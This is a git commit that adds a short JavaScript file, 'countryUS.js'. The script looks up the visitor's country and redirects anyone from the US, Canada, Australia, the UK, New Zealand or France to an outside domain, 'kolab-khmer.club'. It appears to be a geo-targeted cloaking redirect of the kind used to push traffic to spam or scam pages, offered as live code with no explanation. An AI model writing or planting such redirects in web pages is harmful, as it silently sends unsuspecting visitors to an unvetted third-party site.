ec00ebfee08d174ef171311468927a429b560b09
horng2020 <56008358+horng2020@users.noreply.github.com>
2020-02-01 07:14:35 +0700

    countryUS

---
+++ countryUS.js
@@ -0,0 +1,14 @@
+if (geoplugin_countryCode() == "US") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to United States -->
+        } else if (geoplugin_countryCode() == "CA") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to Canada -->
+        } else if (geoplugin_countryCode() == "AU") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to Australia -->
+        } else if (geoplugin_countryCode() == "GB") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to United Kingdom -->
+        } else if (geoplugin_countryCode() == "NZ") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to New Zealand -->
+        } else if (geoplugin_countryCode() == "FR") {
+            window.location.href = "//kolab-khmer.club"    <!-- This directs to France -->
+        } 
+		
